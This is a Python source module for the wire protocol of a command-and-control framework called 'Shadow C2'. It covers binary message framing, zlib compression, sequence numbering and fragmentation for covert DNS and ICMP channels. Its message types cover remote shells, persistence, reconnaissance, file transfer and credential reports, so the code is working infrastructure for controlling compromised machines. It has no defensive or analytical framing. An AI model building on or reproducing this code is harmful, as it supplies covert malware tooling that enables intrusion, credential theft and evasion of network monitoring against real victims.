#!/usr/bin/env python3
"""
Shadow C2 — Custom Binary Wire Protocol
Header: MAGIC(4) + VERSION(1) + MSG_TYPE(1) + SEQUENCE(4) + PAYLOAD_LEN(4) + CHECKSUM(4) = 18 bytes
Fragment support for low-bandwidth channels (DNS, ICMP).
"""

import struct
import zlib
import json
import time
import threading
from enum import IntEnum
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

MAGIC = b"\xDE\xAD\xC2\x00"
VERSION = 1
HEADER_SIZE = 18  # 4+1+1+4+4+4


class MessageType(IntEnum):
    REGISTER    = 0x01
    BEACON      = 0x02
    TASK        = 0x03
    RESULT      = 0x04
    FILE_UP     = 0x05
    FILE_DOWN   = 0x06
    KEY_ROTATE  = 0x07
    ACK         = 0x08
    ERROR       = 0x09
    SHELL       = 0x0A
    PERSIST     = 0x0B
    RECON       = 0x0C
    CRED_REPORT = 0x0D
    HEARTBEAT   = 0x0E


# ---------------------------------------------------------------------------
# Message
# ---------------------------------------------------------------------------

@dataclass
class Message:
    """A single protocol message."""
    msg_type: int
    sequence: int
    payload: bytes
    checksum: int = 0

    def pack(self) -> bytes:
        """Serialize to wire format."""
        crc = zlib.crc32(self.payload) & 0xFFFFFFFF
        header = struct.pack("!4sBBIII",
                             MAGIC,
                             VERSION,
                             self.msg_type,
                             self.sequence,
                             len(self.payload),
                             crc)
        return header + self.payload

    @staticmethod
    def unpack(data: bytes) -> Optional['Message']:
        """Deserialize from wire format."""
        if len(data) < HEADER_SIZE:
            return None

        magic, version, msg_type, sequence, payload_len, checksum = struct.unpack(
            "!4sBBIII", data[:HEADER_SIZE])

        if magic != MAGIC:
            return None
        if version != VERSION:
            return None
        if len(data) < HEADER_SIZE + payload_len:
            return None

        payload = data[HEADER_SIZE:HEADER_SIZE + payload_len]
        actual_crc = zlib.crc32(payload) & 0xFFFFFFFF
        if actual_crc != checksum:
            return None

        return Message(
            msg_type=msg_type,
            sequence=sequence,
            payload=payload,
            checksum=checksum,
        )


# ---------------------------------------------------------------------------
# Compression
# ---------------------------------------------------------------------------

def compress(data: bytes) -> bytes:
    """Zlib compress (level 9)."""
    return zlib.compress(data, 9)


def decompress(data: bytes) -> bytes:
    """Zlib decompress."""
    return zlib.decompress(data)


# ---------------------------------------------------------------------------
# High-level builders
# ---------------------------------------------------------------------------

_sequence_counter = 0
_seq_lock = threading.Lock()


def _next_sequence() -> int:
    global _sequence_counter
    with _seq_lock:
        _sequence_counter = (_sequence_counter + 1) & 0xFFFFFFFF
        return _sequence_counter


def build_message(msg_type: MessageType, payload_dict: dict) -> Message:
    """
    Build a protocol message:
    1. JSON-encode the payload dict
    2. Compress with zlib
    3. Wrap in Message with header
    """
    json_bytes = json.dumps(payload_dict, separators=(",", ":")).encode()
    compressed = compress(json_bytes)
    return Message(
        msg_type=int(msg_type),
        sequence=_next_sequence(),
        payload=compressed,
    )


def parse_message(data: bytes) -> Optional[Tuple[MessageType, dict]]:
    """
    Parse a protocol message:
    1. Unpack Message
    2. Decompress payload
    3. JSON-decode
    Returns (msg_type, payload_dict) or None.
    """
    msg = Message.unpack(data)
    if msg is None:
        return None
    try:
        decompressed = decompress(msg.payload)
        payload_dict = json.loads(decompressed)
        return MessageType(msg.msg_type), payload_dict
    except Exception:
        return None


def build_raw_message(msg_type: MessageType, payload: bytes) -> Message:
    """Build message with raw bytes payload (no JSON, no compression)."""
    return Message(
        msg_type=int(msg_type),
        sequence=_next_sequence(),
        payload=payload,
    )


# ---------------------------------------------------------------------------
# Fragment Manager (for DNS / ICMP channels)
# ---------------------------------------------------------------------------

FRAG_HEADER_SIZE = 6  # frag_id(2) + total_frags(2) + frag_index(2)


@dataclass
class Fragment:
    """A single fragment of a larger message."""
    frag_id: int        # 16-bit fragment group ID
    total_frags: int    # total number of fragments
    frag_index: int     # this fragment's index (0-based)
    data: bytes         # fragment payload

    def pack(self) -> bytes:
        return struct.pack("!HHH", self.frag_id, self.total_frags, self.frag_index) + self.data

    @staticmethod
    def unpack(data: bytes) -> Optional['Fragment']:
        if len(data) < FRAG_HEADER_SIZE:
            return None
        frag_id, total, index = struct.unpack("!HHH", data[:FRAG_HEADER_SIZE])
        return Fragment(
            frag_id=frag_id,
            total_frags=total,
            frag_index=index,
            data=data[FRAG_HEADER_SIZE:],
        )


class FragmentManager:
    """
    Fragment large messages for low-bandwidth channels.
    Handles reassembly of incoming fragments.
    """

    def __init__(self):
        self._buffers: Dict[int, Dict[int, bytes]] = {}  # {frag_id: {index: data}}
        self._meta: Dict[int, int] = {}                   # {frag_id: total_frags}
        self._timestamps: Dict[int, float] = {}           # {frag_id: last_seen}
        self._frag_counter = 0
        self._lock = threading.Lock()

    def fragment(self, message_bytes: bytes, max_payload: int = 200) -> List[Fragment]:
        """Split a message into fragments."""
        with self._lock:
            self._frag_counter = (self._frag_counter + 1) & 0xFFFF
            frag_id = self._frag_counter

        chunks = [message_bytes[i:i + max_payload]
                  for i in range(0, len(message_bytes), max_payload)]

        if not chunks:
            chunks = [b""]

        return [
            Fragment(frag_id=frag_id, total_frags=len(chunks),
                     frag_index=i, data=chunk)
            for i, chunk in enumerate(chunks)
        ]

    def add_fragment(self, fragment: Fragment) -> Optional[bytes]:
        """
        Add a received fragment. Returns reassembled message if all
        fragments for this frag_id are received, else None.
        """
        with self._lock:
            fid = fragment.frag_id

            if fid not in self._buffers:
                self._buffers[fid] = {}
                self._meta[fid] = fragment.total_frags

            self._buffers[fid][fragment.frag_index] = fragment.data
            self._timestamps[fid] = time.time()

            if len(self._buffers[fid]) >= self._meta[fid]:
                # All fragments received — reassemble
                message = b""
                for i in range(self._meta[fid]):
                    message += self._buffers[fid].get(i, b"")
                # Cleanup
                del self._buffers[fid]
                del self._meta[fid]
                del self._timestamps[fid]
                return message

        return None

    def has_all_fragments(self, frag_id: int) -> bool:
        with self._lock:
            if frag_id not in self._buffers:
                return False
            return len(self._buffers[frag_id]) >= self._meta.get(frag_id, 0)

    def cleanup_stale(self, timeout: float = 60.0):
        """Remove fragment buffers older than timeout."""
        now = time.time()
        with self._lock:
            stale = [fid for fid, ts in self._timestamps.items()
                     if now - ts > timeout]
            for fid in stale:
                self._buffers.pop(fid, None)
                self._meta.pop(fid, None)
                self._timestamps.pop(fid, None)

    def pending_count(self) -> int:
        """Number of incomplete fragment groups."""
        with self._lock:
            return len(self._buffers)
